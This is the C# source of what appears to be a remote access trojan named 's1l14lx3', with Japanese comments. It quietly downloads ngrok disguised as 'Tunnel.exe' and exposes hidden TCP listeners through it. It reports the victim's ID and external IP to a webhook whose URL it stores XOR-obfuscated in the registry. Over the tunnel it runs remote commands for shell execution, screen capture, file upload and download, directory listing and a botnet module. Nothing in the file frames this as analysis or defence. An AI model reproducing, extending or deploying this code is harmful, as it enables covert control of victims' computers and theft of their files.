using Codeplex.Data;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Newtonsoft.Json;
using s1l14lx3;
using System;
using System.Collections;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Metadata;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static System.Windows.Forms.DataFormats;

public class Program
{
    public static bool RUNPROGRAM = true;

    //debug setting

    //end
    public static async Task Main(string[] args)
    {
        try
        {
            //setup
            if (!File.Exists(Import.Dir + "Tunnel.exe"))
            {
                S1l14lx3_Module.FILE_GET("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip", Import.Dir + @"Tunnel.zip");
                ZipFile.ExtractToDirectory(Import.Dir + @"Tunnel.zip", Import.Dir + @"Tunnel\");
                File.Move(Import.Dir + @"Tunnel\ngrok.exe", Import.Dir + @"Tunnel.exe");
                Directory.Delete(Import.Dir + @"Tunnel\",true);
            }
            bool WiFi = S1l14lx3.CheckWiFi();
            while (!WiFi)
            {
                WiFi = S1l14lx3.CheckWiFi();
                Thread.Sleep(10000);
            }
            string id = S1l14lx3_Module.GETID();
            string wh = S1l14lx3_Module.GETWH();
            string cID = S1l14lx3_Module.GETCID();

            if (id == "Error" || id == "" || wh == "Error" || wh == "" || cID == "Error" || cID == "")
            {
                var characters = "qwertyuiopasdfghjklzxcvbnm1234567890";
                var Charsarr = new char[8];
                var random = new Random();
                for (int i = 0; i < Charsarr.Length; i++)
                {
                    Charsarr[i] = characters[random.Next(characters.Length)];
                }
                var resultString = new String(Charsarr);
                Import.ID = resultString;
                Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "ID", resultString);
                //channel setting
                string ResJson = await S1l14lx3_Module.ChannelCreate();
                var dynajson = DynaJson.JsonObject.Parse(ResJson);
                Import.ChannelID = dynajson.id;
                Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "cID", dynajson.id);
                ResJson = await S1l14lx3_Module.WebhookCreate();
                dynajson = DynaJson.JsonObject.Parse(ResJson);
                Import.Webhook = dynajson.url;
                Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "Webhook", Tools.XOREncode(dynajson.url, Encoding.UTF8.GetBytes(Import.ID)[1]));
                await S1l14lx3_Module.WEBHOOK_POST($"UserAdded : ```{Import.ID}```");
                await S1l14lx3_Module.WEBHOOK_POST($"UserID : ```{Import.ID}```");
                await S1l14lx3_Module.WEBHOOK_POST($"Webhook : ```{Import.Webhook}```");
            }
            else
            {
                Import.ID = id;
                Import.Webhook = Tools.XORDecode(wh, Encoding.UTF8.GetBytes(Import.ID)[1]);
                Import.ChannelID = cID;
            }
            //remote access start
            S1l14lx3.RunMain = true;
            S1l14lx3.RunSub = true;
            S1l14lx3.MainThread.Start();
            S1l14lx3.SubThread.Start();

            Tools.Wait();
        }
        catch (Exception ex)
        {
            await S1l14lx3_Module.WEBHOOK_POST($"System Error```{ex.Message}```");
        }
    }
}
public class S1l14lx3
{
    public static Thread MainThread = new Thread(MAIN_THREAD);
    public static Thread SubThread = new Thread(SUB_THREAD);
    public static Thread ModuleThread;
    public static bool RunMain = true;
    public static bool RunSub = true;
    public static int MainPort = 59183;
    public static int SubPort = 59182;
    public static IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
    public static TcpListener serverSocket = new TcpListener(ipAddress, MainPort);
    public static TcpListener SubserverSocket = new TcpListener(ipAddress, SubPort);
    public static TcpClient clientSocket;
    public static NetworkStream networkStream;
    public static TcpClient SubclientSocket;
    public static NetworkStream SubnetworkStream;

    public static async void MAIN_THREAD()
    {
        while (true)
        {
            Process Fprocess = new Process();
            Fprocess.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
            Fprocess.StartInfo.Arguments = $"config add-authtoken {Import.NGROKTOKEN}";
            Fprocess.StartInfo.CreateNoWindow = true;
            Fprocess.StartInfo.UseShellExecute = false;
            Fprocess.StartInfo.RedirectStandardOutput = true;
            Fprocess.Start();
            Fprocess.WaitForExit();

            Process process = new Process();
            process.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
            process.StartInfo.Arguments = "tcp 59183";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string externalIpString = new WebClient().DownloadString("https://ipinfo.io/ip");
            var externalIp = IPAddress.Parse(externalIpString);

            await S1l14lx3_Module.WEBHOOK_POST("Process started \\n# [Ngrok dashboard](https://dashboard.ngrok.com/tunnels/agents)");
            await S1l14lx3_Module.WEBHOOK_POST($"Client IP : ```{externalIp}```");

            serverSocket.Start();
            clientSocket = serverSocket.AcceptTcpClient();
            networkStream = clientSocket.GetStream();

            // メッセージを返信
            /*/
            byte[] messageBytes = Encoding.UTF8.GetBytes("{CONTENT}");
            networkStream.Write(messageBytes, 0, messageBytes.Length);
            /*/

            string BeforeCMD = "";
            while (RunMain)
            {
                //listen
                byte[] buffer = new byte[1024];
                int bytesRead = networkStream.Read(buffer, 0, buffer.Length);
                string GetCommand = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                if (GetCommand == "Error")
                {
                    continue;
                }
                string[] Command = { };
                RemoteCommand data = JsonConvert.DeserializeObject<RemoteCommand>(GetCommand);
                if (data == null)
                {
                    continue;
                }
                else
                {
                    Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
                }
                if (GetCommand == BeforeCMD)
                {
                    continue;
                }
                else if (GetCommand == "")
                {
                    continue;
                }
                BeforeCMD = GetCommand;
                switch (Command[0])
                {
                    //Windows Command Prompt
                    case "wcp":
                        ModuleThread = new Thread(S1l14lx3_Module.WCP);
                        ModuleThread.Start(Command);
                        break;
                    //Screen Capture
                    case "scc":
                        ModuleThread = new Thread(S1l14lx3_Module.SCC);
                        ModuleThread.Start(Command);
                        break;
                    //File upload
                    case "upload":
                        ModuleThread = new Thread(S1l14lx3_Module.UPLOAD);
                        ModuleThread.Start(Command);
                        break;
                    //File download
                    case "download":
                        ModuleThread = new Thread(S1l14lx3_Module.DOWNLOAD);
                        ModuleThread.Start(Command);
                        break;
                    //Directory & File List
                    case "d&fl":
                        ModuleThread = new Thread(S1l14lx3_Module.DFL);
                        ModuleThread.Start(Command);
                        break;
                    //Toast Message
                    case "message":
                        ModuleThread = new Thread(S1l14lx3_Module.TOAST);
                        ModuleThread.Start(Command);
                        break;
                    //Beep
                    case "beep":
                        ModuleThread = new Thread(S1l14lx3_Module.BEEP);
                        ModuleThread.Start(Command);
                        break;
                    //Debug
                    case "?":
                        Console.WriteLine(await S1l14lx3_Module.WEBHOOK_POST("生きてるよ (debug用)"));
                        byte[] messageBytes = Encoding.UTF8.GetBytes("Online");
                        networkStream.Write(messageBytes, 0, messageBytes.Length);
                        break;
                    /*/TCP console (没)
                    case "console":
                        ModuleThread = new Thread(S1l14lx3_Module.CONSOLE);
                        ModuleThread.Start(Command);
                        break;
                    /*/
                    //Stop
                    case "stop":
                        ModuleThread.Abort();
                        break;
                    //Close
                    case "close":
                        networkStream.Close();
                        clientSocket.Close();
                        serverSocket.Stop();
                        await S1l14lx3_Module.WEBHOOK_POST($"Disconected\\nID : ```{Import.ID}```");
                        RunSub = false;
                        break;
                    //Exit
                    case "exit":
                        networkStream.Close();
                        clientSocket.Close();
                        serverSocket.Stop();
                        await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\\nID : ```{Import.ID}```");
                        Environment.Exit(0);
                        break;
                    //Default
                    default:
                        continue;
                        /*/
                           //Comment
                        case "CMD":
                            //Code
                            break;
                        /*/
                }
            }
        }
    }
    public static async void SUB_THREAD()
    {
        Process Fprocess = new Process();
        Fprocess.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
        Fprocess.StartInfo.Arguments = $"config add-authtoken {Import.NGROKTOKEN}";
        Fprocess.StartInfo.CreateNoWindow = true;
        Fprocess.StartInfo.UseShellExecute = false;
        Fprocess.StartInfo.RedirectStandardOutput = true;
        Fprocess.Start();
        Fprocess.WaitForExit();

        Process process = new Process();
        process.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
        process.StartInfo.Arguments = "tcp 59182";
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();

        await S1l14lx3_Module.WEBHOOK_POST("Process started \\n # [Ngrok dashboard](https://dashboard.ngrok.com/tunnels/agents)");

        serverSocket.Start();
        clientSocket = serverSocket.AcceptTcpClient();
        networkStream = clientSocket.GetStream();

        // メッセージを返信
        /*/
        byte[] messageBytes = Encoding.UTF8.GetBytes("{CONTENT}");
        networkStream.Write(messageBytes, 0, messageBytes.Length);
        /*/

        string BeforeCMD = "";
        while (RunSub)
        {
            //listen
            byte[] buffer = new byte[1024];
            int bytesRead = networkStream.Read(buffer, 0, buffer.Length);
            string GetCommand = Encoding.UTF8.GetString(buffer, 0, bytesRead);

            if (GetCommand == "Error")
            {
                continue;
            }
            string[] Command = { };
            RemoteCommand data = JsonConvert.DeserializeObject<RemoteCommand>(GetCommand);
            if (data == null)
            {
                continue;
            }
            else
            {
                Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
            }
            if (GetCommand == BeforeCMD)
            {
                continue;
            }
            else if (GetCommand == "")
            {
                continue;
            }
            BeforeCMD = GetCommand;
            switch (Command[0])
            {
                //Windows Command Prompt
                case "wcp":
                    ModuleThread = new Thread(S1l14lx3_Module.WCP);
                    ModuleThread.Start(Command);
                    break;
                //Screen Capture
                case "scc":
                    ModuleThread = new Thread(S1l14lx3_Module.SCC);
                    ModuleThread.Start(Command);
                    break;
                //File upload
                case "upload":
                    ModuleThread = new Thread(S1l14lx3_Module.UPLOAD);
                    ModuleThread.Start(Command);
                    break;
                //File download
                case "download":
                    ModuleThread = new Thread(S1l14lx3_Module.DOWNLOAD);
                    ModuleThread.Start(Command);
                    break;
                //Directory & File List
                case "d&fl":
                    ModuleThread = new Thread(S1l14lx3_Module.DFL);
                    ModuleThread.Start(Command);
                    break;
                //Toast Message
                case "message":
                    ModuleThread = new Thread(S1l14lx3_Module.TOAST);
                    ModuleThread.Start(Command);
                    break;
                //Beep
                case "beep":
                    ModuleThread = new Thread(S1l14lx3_Module.BEEP);
                    ModuleThread.Start(Command);
                    break;
                //Bot Net Module start
                case "bnms":
                    ModuleThread = new Thread(S1l14lx3_Module.BNMs);
                    ModuleThread.Start(Command);
                    break;
                //Debug
                case "?":
                    Console.WriteLine(await S1l14lx3_Module.WEBHOOK_POST("生きてるよ (debug用)"));
                    byte[] messageBytes = Encoding.UTF8.GetBytes("Online");
                    networkStream.Write(messageBytes, 0, messageBytes.Length);
                    break;
                //Stop
                case "stop":
                    ModuleThread.Abort();
                    break;
                //Close
                case "close":
                    networkStream.Close();
                    clientSocket.Close();
                    serverSocket.Stop();
                    await S1l14lx3_Module.WEBHOOK_POST($"Disconected\\nID : ```{Import.ID}```");
                    RunMain = false;
                    break;
                //Exit
                case "exit":
                    networkStream.Close();
                    clientSocket.Close();
                    serverSocket.Stop();
                    await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\\nID : ```{Import.ID}```");
                    Environment.Exit(0);
                    break;
                //Default
                default:
                    continue;
                    /*/
                       //Comment
                    case "CMD":
                        //Code
                        break;
                    /*/
            }
        }
    }
    public static bool CheckWiFi()
    {
        if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
        {
            return true;
        }
        else
        {
            return false;
        }
    }
}